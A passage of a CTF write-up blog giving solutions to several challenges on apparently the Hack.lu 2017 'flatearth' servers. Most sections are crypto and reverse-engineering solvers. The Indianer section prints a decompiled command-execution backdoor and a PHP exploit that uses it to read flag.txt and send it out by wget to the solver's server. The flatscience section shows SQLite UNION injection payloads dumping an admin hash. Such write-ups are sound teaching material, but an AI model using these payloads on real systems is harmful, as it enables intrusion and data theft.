        s = SocketServer.ThreadingTCPServer(("", LOCAL_PORT), B64Handler)
        try:
            s.serve_forever()
        except KeyboardInterrupt:
            print("shutting down")
            s.shutdown()
            s.socket.close()

if __name__ == "__main__":
    main()</pre>
<p>For each new session, the server create a new random message, allow us to <code>decode</code> <code>MAX_TRIES</code> message with provided <code>crypt</code> function and then filter only base64 compatible characters into a new string, remove the last character if that string length divide 4 remain 1, and finally base64-decode that string.</p>
<p>We can easily findout the secret message by enumerating each byte, except for byte 0 and 4 we need to enumerate 2 bytes, but only enumerating the 4 MSBs are enough, so 1 + 256*2 + 16*6 = 609 tries in worst case, which&#8217;s very enough.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python                                                               
import struct                                                                   
import socket                                                                   
import telnetlib                                                                
import sys, time
import base64                                                   
import string
import re
import random
from binascii import hexlify, unhexlify
import itertools

def recv_utils(s,r,ss):
  while all([not(sss in r) for sss in ss]):
    sa = s.recv(4096)
    r += sa
  return r


def check(ss):
  s.send("1\n")
  recv_utils(s, '', ['What would you like me to decode'])
  s.send(ss)
  ans = recv_utils(s, '', ['Alright, here is your answer: '])
  r = re.search(r'here is your answer: (.*?)\n', ans)
  r = r.group(1)
  return base64.b64encode(r).rstrip('=')

def decrypt(e, s):
  return "".join(map(lambda c: chr(((((ord(c[0])+256-64)%256)^ord(c[1])))%256), zip(e,s)))

while True:
  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
  s.connect(('flatearth.fluxfingers.net', 1718)) 

  if len(check("\x00"*8)) and len(check("\x01"*8)) &gt; 0:
    s.close()
    continue
    
  buf = ["\x00"] * 8
  ss = True
  i = 0
  while i &lt; 8:
    print "Check %d" % (i)
    nlen = 2 if (i%4)==0 else 1
    ssfail = 0
    for ntry in range(16**nlen):
      sys.stdout.write(str(ntry%10))
      sys.stdout.flush()
      if nlen == 1:
        buf[i] = chr(ntry*16+1)
      else:
        buf[i  ] = chr((ntry//16)*16+1)
        buf[i+1] = chr((ntry%16)*16+15-1)
      chk = check("".join(buf))
      if len(chk)&lt;i:
        sys.stdout.write('.')
        sys.stdout.flush()
        continue
      if len(chk)&gt;=i+nlen:
        break
      else:
        ssfail += 1
    print
    if ssfail == 16**nlen:
      ss = False
      break
    i += nlen
  
  if not(ss):
    s.close()
    continue
  
  buf = "".join(buf)
  enc = check(buf)
  print 'buf = ', buf.encode("hex")
  print 'enc = ', enc.encode("hex")
  x = decrypt(enc, buf)
  print 'x = ', x
  s.send("2\n" + hexlify(x)+"\n")
  r = recv_utils(s, '', ['flag', 'looking for'])
  print r
  if 'flag' in r:
    break</pre>
</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto) prime enigma - by midao - 50 (+ 100)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
<p>Hey there fellow lizard how nice of you to drop by! Did you know those filthy humans really think that some numbers have special meanings? Seven, 13 and for some strange reason even 9000. Go and show them that a good prime does not make a secure cryptosystem!</p>
<p><a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/prime-enigma-9611097c559105b8c7dc7da88b973d78.zip">Link</a></p>
</div></div>
<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
<p>This problem encrypt message by using some big exponent as private key, provide us the cipher message and a hint number.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">from secret import flag, key

f = open('ciphertext.txt', 'w')

p = 104438888...4758453247 # 1234 characters number
g = 5
A = 102631253....429994312 # 1234 characters number
d = key
m = int(flag.encode('hex'), 16) % p

B = pow(g, d, p)
k = pow(A, d, p)
c = k * m % p

f.write(str(B) + '\n')
f.write(str(c) + '\n')

f.close()
</pre>
<p>Looking at <code>ciphertext.txt</code> show that <code>B == p - 1</code>, so <code>g^d = -1 mod p</code>, so d maybe (p-1)/2, just try it and that give us the flag:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python

from fractions import gcd
B = 1044388881413152506679602719846529545831269060992135009022588756444338172022322690710444046669809783930111585737890362691860127079270495454517218673016928427459146001866885779762982229321192368303346235204368051010309155674155697460347176946394076535157284994895284821633700921811716738972451834979455897010306333468590751358365138782250372269117968985194322444535687415522007151638638141456178420621277822674995027990278673458629544391736919766299005511505446177668154446234882665961680796576903199116089347634947187778906528008004756692571666922964122566174582776707332452371001272163776841229318324903125740713574141005124561965913888899753461735347970011693256316751660678950830027510255804846105583465055446615090444309583050775808509297040039680057435342253926566240898195863631588888936364129920059308455669454034010391478238784189888594672336242763795138176353222845524644040094258962433613354036104643881925238489224010194193088911666165584229424668165441688927790460608264864204237717002054744337988941974661214699689706521543006262604535890998125752275942608772174376107314217749233048217904944409836238235772306749874396760463376480215133461333478395682746608242585133953883882226786118030184028136755970045385534758453246
p = 1044388881413152506679602719846529545831269060992135009022588756444338172022322690710444046669809783930111585737890362691860127079270495454517218673016928427459146001866885779762982229321192368303346235204368051010309155674155697460347176946394076535157284994895284821633700921811716738972451834979455897010306333468590751358365138782250372269117968985194322444535687415522007151638638141456178420621277822674995027990278673458629544391736919766299005511505446177668154446234882665961680796576903199116089347634947187778906528008004756692571666922964122566174582776707332452371001272163776841229318324903125740713574141005124561965913888899753461735347970011693256316751660678950830027510255804846105583465055446615090444309583050775808509297040039680057435342253926566240898195863631588888936364129920059308455669454034010391478238784189888594672336242763795138176353222845524644040094258962433613354036104643881925238489224010194193088911666165584229424668165441688927790460608264864204237717002054744337988941974661214699689706521543006262604535890998125752275942608772174376107314217749233048217904944409836238235772306749874396760463376480215133461333478395682746608242585133953883882226786118030184028136755970045385534758453247
g = 5
A = 1026312539297800437474663698165859314949881437729617621666434357798219198741950468733395500361477359726152747087790103309627020498122003777642051150130697457594304849673838709900017711265818285080832347734747895550397950729716624922572654209637755195129162139245110756558638081495998280747642920484467428206475906559638681536868548289456924005274209311355030582255692087426910634838198143851507435754029135363794578075936092774722678311786272841489629294721103591751528609388061794369341067986401129462942050916582521451289187645626081017578576190303952351748434876686541368607656026867091583868645619423975306245327421218767449273192101105293424028461698783545171866070124432565063559495566733441286372612161876492134408160732339966921175762866198980795890946054558528891296203285979664329713156129091098226212735763844909789916934266711879564086741733061623347281499025678164709559814150194881622611023214199434022258730549350019749882889143749385314934896284396513061241138504029046053964944026179039768718830854958634216721133676746317913559932277050177463811150719675119168868527853864167729206220819613297736800799391257602899169041109002518019207734013899840092155297682096290489330476118066934735827328128343402508975429994312

m = 626538023179183383530326775878874061243537575637678230775990839517480703838547661223043351239918394865532739593994849154430591305198322288328417436892902443505917379006443598061697092201021536603987285163299838045075649512028921956548205676208712226470308113290505059049053554206416767772651512039632936795232724801922443388952796545084060280910673215063573749033668717290815841834685051547255093401042248880082370281195663905731764841136214458769095907569163184276786105979509363239839613385785232307550226120692268670717158539363476974302593377514937470953649913863219081380729197866499068054753726732556988368232198510160183731571741889761632557457157261911256679728707526809880224074940827825962124087677609578885077944156589121586951372962667391498824853627326311588259929756093569512874696625507873168095797130866697040006079191565592914811736694534863664544646201900855732710994613768016495896341014229622129847800138058041138449691835652916517559125407914079964177419733079221280850917496784527992741048638603428068452948455069671414667008770873913118369984179054902139270844669700487715140145038503768704763641223894377872853332484296603268546135216483844722413025955229649646292980986542646384960063297213437076185709400450

def xgcd(b, n):
  x0, x1, y0, y1 = 1, 0, 0, 1
  while n != 0:
    q, b, n = b // n, n, b % n
    x0, x1 = x1, x0 - q * x1
    y0, y1 = y1, y0 - q * y1
  return  b, x0, y0

ainv = xgcd(A, p)[1]
print (A*ainv % p)
print (p - B)

assert(pow(g, (p-1)/2, p) == p-1)

d = (p-1)/2
m = m * pow(ainv, d, p) % p

print hex(m)[2:-1].decode("hex")</pre>
<div class="su-box su-box-style-default" style="border-color:#afcac9;border-radius:3px"><div class="su-box-title" style="background-color:#dbfcfb;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">INFO</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">flag{If you whistle while you&#8217;re pissing, you have two minds, where one is quite sufficient. If you have two minds, you are at war with yourself. If you are at war with yourself, it is easy for an external force to defeat you. This is why Mong-tse wrote. &#8216;A man must destroy himself before others can destroy him.&#8217; | Lorem ipsum dolor sit amet, consectetur adipisici elit, sed eiusmod tempor incidunt ut labore et dolore magna aliqua. Ut enim ad minim veniam, quis nostrud exercitation ullamaco laboris nisi &#8230;} </div></div>
</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Crypto) salsa - by SLAZ - 200 (+ 15)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
<p>The Flat Earth Society has a secret information storage. There is enough evidence in it, to convince every member of them, that the earth is round. Unfortunately, we don’t have the key &#8230;<br />
nc flatearth.fluxfingers.net 1721</p>
<p><a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/salsa-f6bf6552c473066ddbe2ebdf0634c5b5.zip">Download</a></p>
</div></div>
<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
<p>This problem provide an encryption named salsa20, send the message with flag encrypted, and allow us to encrypt 8192 bytes of data.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">KEY = os.urandom(32)

class TCPHandler(asyncore.dispatcher_with_send):

    def __init__(self, socket):
        asyncore.dispatcher_with_send.__init__(self, socket)
        self.Nonce = os.urandom(8)
        self.MsgCounter = 0
        self.sendMessage("Hello my dear friend, the flag is %s!" % FLAG)

    def sendMessage(self, data):
        text = base64.b64encode(data)
        for i in range(0, len(text), 128):
            msg = {"cnt" : self.MsgCounter, "data" : text[i: i+128]}
            msgtext = json.dumps(msg)
            encdata = salsa20.s20_crypt(KEY, self.Nonce, self.MsgCounter, msgtext)
            self.MsgCounter += 1
            self.send(encdata)

    def handle_read(self):
        data = self.recv(8192)
        if data:
            self.sendMessage(data)</pre>
<p>Bellowing is the main implementation of the encryption:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">def s20_crypt(key, nonce, si, data):
    key = [ord(c) for c in key]
    nonce = [ord(c) for c in nonce]
    
    n = [0] * 16

    for i in range(8):
        n[i] = nonce[i]

    if (si % 64) != 0:
        b0, b1, b2, b3 = s20_rev_littleendian(si / 64)
        n[8] = b0
        n[9] = b1
        n[10] = b2
        n[11] = b3

        keystream = s20_expand32(key, n)
        print "x", ''.join(map(chr, keystream)).encode("hex")

    outp = ""

    for i, c in enumerate(data):
        if ((si+i) % 64) == 0:
            b0, b1, b2, b3 = s20_rev_littleendian((si+i) / 64)
            n[8] = b0
            n[9] = b1
            n[10] = b2
            n[11] = b3

            keystream = s20_expand32(key, n)
            print "y", ''.join(map(chr, keystream)).encode("hex")

        outp += chr(ord(c) ^ keystream[(si+i) % 64])

    return outp</pre>
<p>It clearly shows us that this encryption is just xor the input buffer with a keystrem, and that <code>keystream</code> is shifted by one for each new cryption (controlled by <code>si</code>).</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null">C1 = M1 xor Keystream1
C2 = M2 xor Keystream2
Keystream2 = Keystream1[1:]</pre>
<p>So,</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null">M1[1:] = C1[1:] xor Keystream1[1:]
       = C1[1:] xor Keystream2
       = C1[1:] xor C2 xor M2</pre>
<p>That&#8217;s enough to code the solver:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="python">#!/usr/bin/python                                                               
import struct                                                                   
import socket                                                                   
import telnetlib                                                                
import sys, time                                                           
import string, base64, json
import re
import salsa20

def sxor(s1,s2):    
  return ''.join(chr(ord(a) ^ ord(b)) for a,b in zip(s1,s2))

def recv_utils(s,r,ss):
  while all([not(sss in r) for sss in ss]):
    sa = s.recv(4096)
    #print sa
    r += sa
  return r

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)  
s.connect(('flatearth.fluxfingers.net', 1721))

keybuf = s.recv(4096)

print len(keybuf), keybuf.encode('hex')

s.send('\x00' * 8192)
abuf = ''
while len(abuf) &lt; 8192:
  abuf += s.recv(409600)

print abuf.encode('hex')

msg = {"cnt" : 1, "data" : "A"*128}
msgtext = json.dumps(msg)
print sxor(sxor(keybuf[1:], abuf[:]), msgtext)

#kk = "AAAAAAAAAAAAAAAAAAAAAAA" * 10
#encdata1 = salsa20.s20_crypt("\xBB"*32, "\xAA"*8, 0, "hello world | xyz | abc" * 10)
#encdata2 = salsa20.s20_crypt("\xBB"*32, "\xAA"*8, 2, kk)
#
#print '-', len(encdata1), encdata1.encode('hex')
#
#print sxor(sxor(encdata1[2:], encdata2[:]), kk)</pre>
</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Web, Pwn) Indianer - by hasiH451 - 200 (+ 36)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
<p>Try to enter this <a href="https://indianer.flatearth.fluxfingers.net/">Tipi</a></p>
<p><a href="https://www.vhn.vn/blog/wp-content/uploads/2017/10/indianer-f7d59dea1f5314f2ddd2d9bd401a996c.zip">Download</a></p>
</div></div>
<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
<p>The archive provide us a shared file <code>backdoor.so</code>, which override <code>strlen</code> function:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">__int64 __fastcall strlen(const char *s_1)
{
  size_t slen; // rsi
  __int64 result; // rax
  char *shell_buf; // rax
  signed int i; // [rsp+1Ch] [rbp-134h]
  __int64 (__fastcall *old_strlen)(const char *, const char *); // [rsp+20h] [rbp-130h]
  char *v6; // [rsp+28h] [rbp-128h]
  char *v7; // [rsp+30h] [rbp-120h]
  char *s; // [rsp+38h] [rbp-118h]
  char *sa; // [rsp+38h] [rbp-118h]
  char needle[256]; // [rsp+40h] [rbp-110h]
  char v11; // [rsp+140h] [rbp-10h]
  unsigned __int64 v12; // [rsp+148h] [rbp-8h]

  v12 = __readfsqword(0x28u);
  old_strlen = (__int64 (__fastcall *)(const char *, const char *))dlsym((void *)0xFFFFFFFFFFFFFFFFLL, "strlen");
  if ( !strcmp("GET", s_1) )
    ++trigger;
  slen = (size_t)"ndex.html";
  v7 = strstr(s_1, "ndex.html");
  if ( v7 &amp;&amp; apr_hook_debug_enabled )
  {
    apr_hook_debug_enabled &gt;&gt;= 8;
    *(v7 - 1) += apr_hook_debug_enabled;
    apr_hook_debug_enabled = 0;
    counter = 0;
    result = old_strlen(s_1, "ndex.html");
  }
  else
  {
    memset(needle, 0, sizeof(needle));
    v11 = 0;
    for ( i = 0; i &lt;= 511; i += 9 )
    {
      slen = (unsigned int)(((g_idx[0] &amp; 1) + i) % 24 + 'a');
      needle[i % 35] = ((g_idx[0] &amp; 1) + i) % 24 + 'a';
    }
    needle[g_idx[0]] = 0;
    if ( trigger &amp; 1 )
    {
      ++g_idx[0];
      if ( counter &lt;= 1 )
        ++counter;
      if ( g_idx[0] &gt; 1u )
      {
        slen = old_strlen(s_1, (const char *)slen);
        s = (char *)memmem(s_1, slen, needle, 34uLL);
        if ( s )
        {
          *s = 0;
          shell_buf = &amp;s[strlen(needle)];
          sa = shell_buf + 1;
          if ( *shell_buf == '=' )
          {
            while ( 1 )
            {
              slen = '_';
              v6 = strchr(sa, '_');
              if ( !v6 )
                break;
              *v6 = ' ';
            }
            apr_hook_debug_enabled = system(sa);
          }
        }
      }
    }
    if ( counter &gt; 1 )
      counter = 0;
    result = old_strlen(s_1, (const char *)slen);
  }
  return result;
}</pre>
<p>So we can trigger the backdoor by first including <code>ndex.html</code> in the url, in order to execute <code>apr_hook_debug_enabled = system(sa);</code> line, all the parent if must be satisfied:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">if ( trigger &amp; 1 )</pre>
<p><code>trigger</code> is an increasing number, so this will trigger once every 2 requests.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">if ( g_idx[0] &gt; 1u )</pre>
<p><code>g_idx[0]</code> is also an increasing number whenever the first if is satisfied.</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">slen = old_strlen(s_1, (const char *)slen);
s = (char *)memmem(s_1, slen, needle, 34uLL);
if ( s )</pre>
<p>so it will search for all 34 bytes of needle,</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">if ( *shell_buf == '=' )</pre>
<p>check if that buffer continues with <code>=</code>,</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">while ( 1 )
{
  slen = '_';
  v6 = strchr(sa, '_');
  if ( !v6 )
    break;
  *v6 = ' ';
}
apr_hook_debug_enabled = system(sa);</pre>
<p>replace all <code>_</code> with space <span style="color: #222222; font-family: monospace;"><span style="background-color: #e9ebec;"> </span></span> and then execute that buffer.</p>
<p>So let&#8217;s calculate the needle at that state:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">#include &lt;iostream&gt;

using namespace std;
int main(int argc, char *argv[]) {
  char needle[256];
  char g_idx[1] = {35};
  memset(needle, 0, sizeof(needle));
  for (int i = 0; i &lt;= 511; i += 9 )
  {
    needle[i % 35] = ((g_idx[0] &amp; 1) + i) % 24 + 97;
  }
  needle[g_idx[0]] = 0;
  cout &lt;&lt; needle &lt;&lt; endl;
}</pre>
<p>Which give us</p>
<div class="su-box su-box-style-default" style="border-color:#000000;border-radius:3px"><div class="su-box-title" style="background-color:#000000;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">needle</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">eqeqeqbnbnbnbnbkwkwkwkwhththththqeq</div></div>
<p>And then finally we can start <code>netcat</code> on our server and use wget to send commands output to our server:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">file_get_contents('https://indianer.flatearth.fluxfingers.net/ndex.html');
for($i=0;$i&lt;40;$i++) {
  echo file_get_contents('https://indianer.flatearth.fluxfingers.net/eqeqeqbnbnbnbnbkwkwkwkwhththththqeq=wget_http://$server:$port/`'.str_replace(' ','_','cat /var/www/flag.txt').'`');
}</pre>
</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Misc, Web) flatscience - by Staubfinger - 100 (+ 90)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
<p>The Professor on Flat Earth is Prof. Flux Horst. Only for bragging he made his own Blog showcasing his favorite Papers. Beeing the only Professor, he thinks he is the smartest Person arround the Plate. Can you proof him wrong and log into his Admin-Panel?<br />
<a href="https://flatscience.flatearth.fluxfingers.net/">Link</a></p>
</div></div>
<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
<p><code>robots.txt</code> provides us:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null">User-agent: *
Disallow: /login.php
Disallow: /admin.php
</pre>
<p>The login.php source contain:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="html">&lt;!-- TODO: Remove ?debug-Parameter! --&gt;</pre>
<p>So let&#8217;s try appending ?debug to that file, which show us the source code:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">&lt;!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN"&gt;

&lt;html&gt;
&lt;head&gt;
&lt;style&gt;
blockquote { background: #eeeeee; }
h1 { border-bottom: solid black 2px; }
h2 { border-bottom: solid black 1px; }
.comment { color: darkgreen; }
&lt;/style&gt;

&lt;meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1"&gt;
&lt;title&gt;Login&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;


&lt;div align=right class=lastmod&gt;
Last Modified: Fri Mar  31:33:7 UTC 1337
&lt;/div&gt;

&lt;h1&gt;Login&lt;/h1&gt;

Login Page, do not try to hax here plox!&lt;br&gt;


&lt;form method="post"&gt;
  ID:&lt;br&gt;
  &lt;input type="text" name="usr"&gt;
  &lt;br&gt;
  Password:&lt;br&gt; 
  &lt;input type="text" name="pw"&gt;
  &lt;br&gt;&lt;br&gt;
  &lt;input type="submit" value="Submit"&gt;
&lt;/form&gt;

&lt;?php
if(isset($_POST['usr']) &amp;&amp; isset($_POST['pw'])){
        $user = $_POST['usr'];
        $pass = $_POST['pw'];

        $db = new SQLite3('../fancy.db');

        $res = $db-&gt;query("SELECT id,name from Users where name='".$user."' and password='".sha1($pass."Salz!")."'");
    if($res){
        $row = $res-&gt;fetchArray();
    }
    else{
        echo "&lt;br&gt;Some Error occourred!";
    }

        if(isset($row['id'])){
                setcookie('name',' '.$row['name'], time() + 60, '/');
                header("Location: /");
                die();
        }

}

if(isset($_GET['debug']))
highlight_file('login.php');
?&gt;
&lt;!-- TODO: Remove ?debug-Parameter! --&gt;
</pre>
<p>That&#8217;s clearly sqlite injection, we can obtain the schema by</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null">usr=' union select 1,(select sql from sqlite_master limit 1)--&amp;pw=</pre>
<pre class="EnlighterJSRAW" data-enlighter-language="sql">CREATE TABLE Users(
id int primary key,
name varchar(255),
password varchar(255),
hint varchar(255)
)</pre>
<p>And then the admin record:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="null">usr=' union select 1,(select id || '; ' || name || '; ' || password || '; ' || hint from Users limit 1)--&amp;pw=</pre>
<pre class="EnlighterJSRAW" data-enlighter-language="null">1; admin; 3fab54a50e770d830c0416df817567662a9dc85c; my fav word in my fav paper?!</pre>
<p>So just scrape all the pdfs and look for the password</p>
<pre class="EnlighterJSRAW" data-enlighter-language="php">foreach(glob("pdfs/*.pdf") as $pdf){
  passthru("pdftotext $pdf");
  $txt = file_get_contents(substr($pdf, 0, -4) . ".txt");
  preg_match_all("@[^\n\r\t\s]+@", $txt, $m);
  foreach($m[0] as $l) {
    if (sha1($l."Salz!")=="3fab54a50e770d830c0416df817567662a9dc85c") {
      die($l);
    }
  }
}
</pre>
<p>Password is <code>ThinJerboa</code>, logging into admin.php give us the flag:</p>
<div class="su-box su-box-style-default" style="border-color:#000000;border-radius:3px"><div class="su-box-title" style="background-color:#000000;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">FLAG</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">flag{Th3_Fl4t_Earth_Prof_i$_n0T_so_Smart_huh?}</div></div>
</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
<div class="su-box su-box-style-default" style="border-color:#292929;border-radius:3px"><div class="su-box-title" style="background-color:#333333;color:#FFFFFF;border-top-left-radius:1px;border-top-right-radius:1px">(Rev) The Maya Society - by bykunte_ - 50 (+ 91)</div><div class="su-box-content su-clearfix" style="border-bottom-left-radius:1px;border-bottom-right-radius:1px">
<p>Maya society was broken into a class structure with four main levels: the nobility (Maya almehenob), the priesthood (Maya ahkinob), the common people (Maya ah chembal uinieol), and the slaves (Maya ppencatob). The most powerful of the ruling elite was known as the halach uinic. The halach uinic are alive and still secretly hold meetings today. You have to reverse engineer their communication and infiltrate the ruling elite. <a href="https://maya.flatearth.fluxfingers.net/">Link</a></p>
</div></div>
<div class="su-expand su-expand-collapsed su-expand-link-style-default" data-height="100"><div class="su-expand-content" style="color:#333333;max-height:100px;overflow:hidden">
<p>The webpage has a download button which provide a <code>launcher</code> file:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ file launcher
launcher: ELF 64-bit LSB shared object, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=464269c36073a8820e69146b00cc8e68d1f50718, stripped</pre>
<p>loading with IDA give us</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">signed __int64 __fastcall main(__int64 a1, char **a2, char **a3)
{
  size_t v3; // rbx
  size_t v4; // rax
  size_t v6; // rax
  size_t v7; // rax
  __int64 v8; // rdi
  time_t timer; // [rsp+18h] [rbp-128h]
  char v10[8]; // [rsp+20h] [rbp-120h]
  char src; // [rsp+40h] [rbp-100h]
  char s; // [rsp+60h] [rbp-E0h]
  __int64 v13; // [rsp+C8h] [rbp-78h]
  char v14; // [rsp+D4h] [rbp-6Ch]
  char v15; // [rsp+DDh] [rbp-63h]
  char v16; // [rsp+E6h] [rbp-5Ah]
  char v17; // [rsp+EFh] [rbp-51h]
  void (__cdecl *v18)(__int64); // [rsp+F8h] [rbp-48h]
  __int64 v19; // [rsp+100h] [rbp-40h]
  char *v20; // [rsp+108h] [rbp-38h]
  char *dest; // [rsp+110h] [rbp-30h]
  int *v22; // [rsp+118h] [rbp-28h]
  size_t v23; // [rsp+120h] [rbp-20h]
  struct tm *tp; // [rsp+128h] [rbp-18h]

  strcpy(v10, ".fluxfingers.net");
  timer = time(0LL);
  tp = localtime(&amp;timer);
  strftime(&amp;s, 0x63uLL, "%Y-%m-%d", tp);
  v23 = strlen(&amp;s);
  sub_B5A(&amp;s, v23);
  v22 = &amp;dword_2030B8;
  snprintf(
    &amp;v17,
    9uLL,
    "%02x%02x%02x%02x",
    (unsigned __int8)dword_2030B8,
    BYTE1(dword_2030B8),
    BYTE2(dword_2030B8),
    HIBYTE(dword_2030B8));
  v22 = &amp;dword_2030C0;
  snprintf(
    &amp;v16,
    9uLL,
    "%02x%02x%02x%02x",
    (unsigned __int8)dword_2030C0,
    BYTE1(dword_2030C0),
    BYTE2(dword_2030C0),
    HIBYTE(dword_2030C0));
  v22 = &amp;dword_2030B4;
  snprintf(
    &amp;v15,
    9uLL,
    "%02x%02x%02x%02x",
    (unsigned __int8)dword_2030B4,
    BYTE1(dword_2030B4),
    BYTE2(dword_2030B4),
    HIBYTE(dword_2030B4));
  v22 = &amp;dword_2030BC;
  snprintf(
    &amp;v14,
    9uLL,
    "%02x%02x%02x%02x",
    (unsigned __int8)dword_2030BC,
    BYTE1(dword_2030BC),
    BYTE2(dword_2030BC),
    HIBYTE(dword_2030BC));
  snprintf(&amp;src, 0x21uLL, "%s%s%s%s", &amp;v17, &amp;v16, &amp;v15, &amp;v14);
  v3 = strlen(&amp;src);
  v4 = strlen(v10);
  dest = (char *)malloc(v3 + v4 + 1);
  if ( !dest )
    return 1LL;
  *dest = 0;
  strcat(dest, &amp;src);
  strcat(dest, v10);
  v20 = (char *)sub_18A4(dest, v10);
  if ( !v20 )
    return 1LL;
  v6 = strlen(v20);
  v19 = sub_15E0(v20, v6, &amp;v13);
  v7 = strlen(v20);
  v18 = (void (__cdecl *)(__int64))sub_15E0(v20, v7, &amp;v13);
  if ( !v19 )
    return 1LL;
  v8 = v19;
  sub_1858(v19, v13, v18);
  v18(v8);
  return 0LL;
}</pre>
<p>So this main file will do something starting from a string which create from current date, the original webpage contains <code>© 2012</code> which hint us that this webpage is <em>created</em> in 2012, so i create a simple C file to use with LD_PRELOAD to fake the time:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="cpp">#include &lt;stdlib.h&gt;
#include &lt;stdio.h&gt;
int time(int) {
  return atoi(getenv("CURR_TIME"));
}</pre>
<p>and then just try every timestamp starting from 2012-01-01 will give us the password @ 2012-12-21:</p>
<pre class="EnlighterJSRAW" data-enlighter-language="shell">$ CURR_TIME=1356066000 LD_PRELOAD=$(pwd)/fake.so ./launcher
flag{e3a03c6f3fe91b40eaa8e71b41f0db12}
</pre>
</div><div class="su-expand-link su-expand-link-more" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show more</span></a></div><div class="su-expand-link su-expand-link-less" style="text-align:left"><a href="javascript:;" style="color:#0088FF;border-color:#0088FF"><span style="border-color:#0088FF">Show less</span></a></div></div>
